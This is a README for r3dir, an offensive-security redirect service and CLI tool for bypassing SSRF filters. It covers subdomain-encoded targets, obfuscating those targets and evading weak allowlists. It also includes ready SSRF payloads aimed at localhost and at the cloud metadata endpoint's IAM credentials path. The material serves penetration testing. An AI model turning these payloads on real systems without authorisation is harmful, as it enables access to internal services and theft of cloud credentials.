# r3dir 
![Version](https://img.shields.io/pypi/v/r3dir) ![PyPI pyversions](https://img.shields.io/pypi/pyversions/r3dir)  ![LICENSE](https://img.shields.io/pypi/l/r3dir)

Redirection service designed to help bypass SSRF filters that do not validate the redirect location. It allows you to:

- Set the redirection target via URL parameters or subdomains;
- Control HTTP response codes;
- Obfuscate the target URL with Base32 encoding;
- Bypass some allowlist filters.

Details about features of HTTP redirects in SSRF cases and how to utilize them via `r3dir` tool you can find in my article.

The service is currently run at the `r3dir.me` domain and supports both HTTP and HTTPS.

## Usage
`r3dir` provides two approaches to set redirection targets: parameter-based and domain-based.

### Setting HTTP status code
Both approaches let you control HTTP status code of a response via first subdomain of `r3dir.me` URL.

```bash
302.r3dir.me -> 302 Found
307.r3dir.me -> 307 Temporary Redirect
200.r3dir.me -> 200 OK
```

You connect to r3dir via HTTP(e.g., http://307.r3dir.me), any HTTP code in `200..599` range can be used. However, due some limitations of TLS certificates(see bellow), in case of HTTPS connection only `3XX`, `200`, `404`, `500` are available.

### Parameter-based redirection
To define the redirection target via a URL parameter, use `/--to/?url=...`. This method can be used when you can use full URL as SSRF payload without limitations.

```bash
#Redirects to http://localhost with `307 Temporary Redirect` status code
https://307.r3dir.me/--to/?url=http://localhost 
```

### Domain-based redirection

Basically, you can control only host part of URL to successfully perform SSRF via HTTP redirection. While existing tools require manual configuration of redirection targets in such case, `r3dir` provides an ability to dynamically set a target via subdomains. 

![r3dir_decoding_flow_upd](https://user-images.githubusercontent.com/62111809/231235695-54ad0d45-ed57-42a3-a3cd-a38538ca8215.png)

As you can see, subdomains contain splited Base32-encoded compressed target which r3dir use to create redirect. 

To create encoded domain, use CLI tool or embed it in BurpSuite as Hackvertor tag(see details below).

### Length limit
Maximum domain length is 253 characters. Unishox2 compression (around 30-40% for common SSRF payloads) compensates Base32 encoding. Thus r3dir provides 1-to-1 ratio for encoded targets on average and you can use r3dir with targets up to 230 characters (considering length of other parts of domain).

### HTTPS limitations

Due to [limitations of wildcard TLS cerficates](https://en.wikipedia.org/wiki/Wildcard_certificate#Limitations) which do not work with multipule wildcard domains(like `*.*.301.r3dir.me`) HTTPS domain-based redirection works with targets that are not longer that 63 symbols(maximum length of one subdomain) in encoded form. In addition, `--ignore_part` feature also is not available due to the limit. 

```bash
#Redirects to http://169.254.169.254/latest/meta-data with `302 Found` status code
https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
```

### Bypassing weak allowlist filters

In addition, any subdomains before `--` subdomain is ignored. The feature let bypass some weak filters which validates substring presence in a domain and works for both approaches.

```bash
#Ignores `some.domain.to.ignore` part and redirects to http://169.254.169.254/latest/meta-data
http://some.domain.to.ignore.--.62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me

#Ignores `some.domain.to.ignore` part and edirects to http://localhost
http://some.domain.to.ignore.--.307.r3dir.me/--to/?url=http://localhost
```

### Automations with r3dir

To notify that target URL is too long to encode, CLI tool raises `TooLongTarget` exception. For fuzzing in BurpSuite with Hackvertor tag or other automations, r3dir encoder has **"Slient Mode"**. Slient mode prevents `TooLongTarget` error and produce an "error domain" for decoder with SHA-1 hash of the long target.

```bash
#Example of TooLongTarget error for HTTPS enforced encoding in Slient Mode 
$ r3dir encode http://169.254.169.254/latest/meta-data/iam/security-credentials/some_role -s --slient_mode
too-long-target-2b57569cfddb7d6f61331e123da605c7573521c9.302.r3dir.me #error-domain with SHA1 hash
```

r3dir decoder will parse such "error domain" and will respond with `414 URI Too Long` status code and message like `The target length has been too long for encoder. Target's SHA-1: 2b57569cfddb7d6f61331e123da605c7573521c9`.

Also, there is [PyPi package](https://pypi.org/project/r3dir) which can be used as library for your own Python scripts and tools. Details and examples how to use you can find on PyPi page.

## CLI tool

### Installation
```bash
pipx install r3dir
```

### Encode mode 
```bash
$ r3dir encode -h
  usage: r3dir encode [-h] [-c STATUS_CODE] [-i IGNORE_PART | -s] [--slient_mode] target_url

  positional arguments:
    target_url            Target URL which r3dir tool should redirect to

  options:
    -h, --help            show this help message and exit
    -c STATUS_CODE, --status_code STATUS_CODE
                          HTTP status code of a redirect response (default: 302)
    -i IGNORE_PART, --ignore_part IGNORE_PART
                          String, which will be ignored during decoding. Used to bypass weak REGEXs
    -s, --https           HTTPS enforced encoding(TLS certificate length limitation)
    --slient_mode         Slient mode for automations (e.g Hackvertor tags)
```

### Decode mode 
```bash
$ r3dir decode -h
  usage: r3dir decode [-h] encoded_domain

  positional arguments:
    encoded_domain  r3dir encoded domain to decode

  options:
    -h, --help      show this help message and exit
```

To use CLI tool with own server, set your domain with `-d` option:
```bash
$ r3dir -h
usage: r3dir [-h] [-d MAIN_DOMAIN] {encode,decode,hackvertor} ...

Encoded/decoder CLI tool for r3dir service

options:
  -h, --help            show this help message and exit
  -d MAIN_DOMAIN, --main_domain MAIN_DOMAIN
                        Domain where r3dir tool is hosted on (default: r3dir.me)

# Example of --main_domain option
$ r3dir -d your.host encode http://localhost
```

## Hackvertor tag

For seamless web application fuzzing, r3dir has a custom Hackvertor tag for BurpSuite. If you haven't seen Hackvertor extension in BurpSuite before, [check it](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100).

To install r3dir Hackvertor tag in BurpSuite, follow next steps:

1. Install CLI tool
```bash
pip3 install r3dir
```

2. Run `r3dir hackvertor` to copy Hackvertor tags into clipboard:
- If you have set up own server, use `-d` option to set a custom `main_domain` for Hackvertor tags.
```bash
r3dir -d your.host hackvertor
```
- If CLI tool does not copy tags in your clipboard, you can use `--print` opiton to output into terminal and copy it manually
```bash
r3dir hackvertor --print
```

3. Add the tag to Hackvertor extension:
- Open Hackvertor menu in BurpSuite sidebar and ensure that ***Allow code execution tags*** is enabled. Go to ***List custom tags***.
![Screenshot 2023-04-10 at 17 35 51](https://user-images.githubusercontent.com/62111809/231236253-012f7357-08ae-4336-959e-6616694184ac.png)
- Then press ***Load tags from clipboard***. 

If you have your own custom tags, export them via ***Export all my tags to clipboard***, add r3dir tags to the exported JSON document and then reimport them.

## HTTP server self-hosting

To spin up own instance, follow next steps:

1. Download the repository
```bash
git clone https://github.com/Horlad/r3dir.git
cd r3dir
```

Out-of-box setup with Let's Encrypt wildcard TLS certificates autorenewal (for HTTPS support) requires the service to be hosted on DigitalOcean droplet with [added domain](https://docs.digitalocean.com/products/networking/dns/quickstart/).

2. Fill environment file (`.env`) with your registered domain (`APP_DOMAIN`), DigitalOcean API token with `read` and `write` scopes (`DO_AUTH_TOKEN`) and email for  Let's Encrypt (`LETSENCRYPT_EMAIL`)
```bash
echo $'APP_DOMAIN=YOUR_DOMAIN\nDO_AUTH_TOKEN=DO_TOKEN\nLETSENCRYPT_EMAIL=YOUR@EMAIL.COM' > .env
```

3. Docker Compose startup (Traefik + HTTP server)
```bash
docker compose up -d
```

You can custom Traefik configuration for different environments. Any configuration contributions for other platforms are highly appreciated.

In addition, if you want to use another HTTPS reverse proxy solution, you can run standalone Docker container with the HTTP service on 80 port.

3. Standalone Docker container startup(HTTP server only)
```bash
docker build . -t r3dir
docker run -p 80:80 -e MAIN_DOMAIN=127.0.0.1.traefik.me r3dir
```
